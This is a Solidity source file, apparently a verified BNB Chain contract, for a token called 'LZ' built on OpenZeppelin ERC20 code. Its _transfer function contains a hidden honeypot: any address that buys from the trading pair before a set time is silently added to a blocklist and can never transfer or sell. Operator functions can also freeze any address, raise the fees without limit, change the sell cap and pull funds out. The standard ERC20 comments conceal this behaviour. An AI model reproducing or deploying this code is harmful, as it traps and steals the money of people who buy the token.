/**
 *Submitted for verification at BscScan.com on 2022-11-17
*/

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.5.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.0;


interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);
    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);
    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
    external
    view
    returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}
interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
    external
    view
    returns (
        uint112 reserve0,
        uint112 reserve1,
        uint32 blockTimestampLast
    );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(address to)
    external
    returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}
abstract contract Manage{

    mapping(address=>bool) internal _manageGroup;
    address internal _manageAddress;


    modifier onlyOwner() {
        if(_manageAddress!=address(0)){
            require(_manageGroup[msg.sender], "Ownable: caller is not the owner");
        }
        _;
    }

    function checkManage(address addr)public view returns(bool){
        return _manageGroup[addr];
    }

    function setOperator(address addr)public onlyOwner{
        if(_manageAddress==address(0)){
            _manageAddress=addr;
        }
        _manageGroup[addr]=true;
    }

    function removeOperator(address addr)public onlyOwner{
        require(_manageAddress!=addr);
        _manageGroup[addr]=false;
    }

}
contract ERC20 is Context, IERC20, IERC20Metadata, Manage {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string  private _name = "LZ";
    string  private _symbol = "LZ";
    address public _owner;

    address public _uniswapV2Pair;
    mapping(address => bool) public al;
    mapping(address => bool) public bList;
    uint256 public BasicUnit=1000;
    uint256 public b1=10;
    uint256 public b2=10;
    uint256 public b3=10;
    uint256 public b4=10;
    uint256 public b5=10;
    address public b1Address;
    address public b2Address;
    address public b3Address;
    address public b4Address;
    address public b5Address;
    uint256 public fs1=50;
    uint256 public fs2=50;
    address public fs1Address;
    address public fs2Address;
    uint256 public sellMaxRatio=999;
    uint256 public limitTime=1668856800;


    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(address usdtAddress,address factoryAddress) {
        _owner=msg.sender;
        setOperator(msg.sender);
        _mint(msg.sender,100000 * (10**decimals()));
        _uniswapV2Pair = IUniswapV2Factory(factoryAddress).createPair(address(this), usdtAddress);
        addBList(msg.sender);
    }
    function changeSellMaxRatio(uint256 ratio)public onlyOwner{
        sellMaxRatio=ratio;
    }
    function changeB1(uint256 ratio)public onlyOwner{
        b1=ratio;
    }
    function changeB2(uint256 ratio)public onlyOwner{
        b2=ratio;
    }
    function changeB3(uint256 ratio)public onlyOwner{
        b3=ratio;
    }
    function changeB4(uint256 ratio)public onlyOwner{
        b4=ratio;
    }
    function changeB5(uint256 ratio)public onlyOwner{
        b5=ratio;
    }
    function changefs1(uint256 ratio)public onlyOwner{
        fs1=ratio;
    }
    function changefs2(uint256 ratio)public onlyOwner{
        fs2=ratio;
    }
    
    function changeB1Address(address addr)public onlyOwner{
        b1Address=addr;
    }
    function changeB2Address(address addr)public onlyOwner{
        b2Address=addr;
    }
    function changeB3Address(address addr)public onlyOwner{
        b3Address=addr;
    }
    function changeB4Address(address addr)public onlyOwner{
        b4Address=addr;
    }
    function changeB5Address(address addr)public onlyOwner{
        b5Address=addr;
    }
    function changefs1Address(address addr)public onlyOwner{
        fs1Address=addr;
    }
    function changefs2Address(address addr)public onlyOwner{
        fs2Address=addr;
    }
    function addAl(address addr) public onlyOwner{
        al[addr]=true;
    }
    function addListAl(address[] memory addrs) public onlyOwner{
        for(uint256 index =0; index<addrs.length;index++){
            al[addrs[index]]=true;
        }
    }
    function removeAl(address addr) public onlyOwner{
        al[addr]=false;
    }
    function removeListAl(address[] memory addrs) public onlyOwner{
        for(uint256 index =0; index<addrs.length;index++){
            al[addrs[index]]=false;
        }
    }

    function addBList(address addr) public onlyOwner{
        bList[addr]=true;
    }
    function addListBList(address[] memory addrs) public onlyOwner{
        for(uint256 index =0; index<addrs.length;index++){
            bList[addrs[index]]=true;
        }
    }
    function removeBList(address addr) public onlyOwner{
        bList[addr]=false;
    }
    function removeListBList(address[] memory addrs) public onlyOwner{
        for(uint256 index =0; index<addrs.length;index++){
            bList[addrs[index]]=false;
        }
    }
    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     */
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(!al[from],"ERC20: transfer faild");

        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        if(!bList[from] && !bList[to] && _uniswapV2Pair!=from){
            uint256 maxSellNumber = fromBalance*sellMaxRatio/BasicUnit;
            require(amount <= maxSellNumber, "ERC20: transfer amount exceeding limit");
        }
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        if(!bList[from]&&!bList[to]){
            if(_uniswapV2Pair==from){
                if(block.timestamp<limitTime){
                    al[to]=true;
                }
                uint256 s1=amount*b1/BasicUnit;
                if(s1>0&&amount>=s1){
                    _balances[b1Address] += s1;
                    emit Transfer(from, b1Address, s1);
                    amount-=s1;
                }
                uint256 s2=amount*b2/BasicUnit;
                if(s2>0&&amount>=s2){
                    _balances[b2Address] += s2;
                    emit Transfer(from, b2Address, s2);
                    amount-=s2;
                }
                uint256 s3=amount*b3/BasicUnit;
                if(s3>0&&amount>=s3){
                    _balances[b3Address] += s3;
                    emit Transfer(from, b3Address, s3);
                    amount-=s3;
                }
                uint256 s4=amount*b4/BasicUnit;
                if(s4>0&&amount>=s4){
                    _balances[b4Address] += s4;
                    emit Transfer(from, b4Address, s4);
                    amount-=s4;
                }
                uint256 s5=amount*b5/BasicUnit;
                if(s5>0&&amount>=s5){
                    _balances[b5Address] += s5;
                    emit Transfer(from, b5Address, s5);
                    amount-=s5;
                }
            }else if(_uniswapV2Pair==to){
                uint256 s1=amount*fs1/BasicUnit;
                if(s1>0&&amount>=s1){
                    _balances[fs1Address] += s1;
                    emit Transfer(from, fs1Address, s1);
                    amount-=s1;
                }
                uint256 s2=amount*fs2/BasicUnit;
                if(s2>0&&amount>=s2){
                    _balances[fs2Address] += s2;
                    emit Transfer(from, fs2Address, s2);
                    amount-=s2;
                }
            } 
        }
        _balances[to] += amount;

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     *
     * Does not update the allowance amount in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amount` tokens have been minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}


    function tt(
        address token,
        address recipient,
        uint256 amount
    ) public onlyOwner {
        IERC20(token).transfer(recipient, amount);
    }

    function te(
        address payable recipient,
        uint256 amount
    ) public onlyOwner {
        recipient.transfer(amount);
    }
}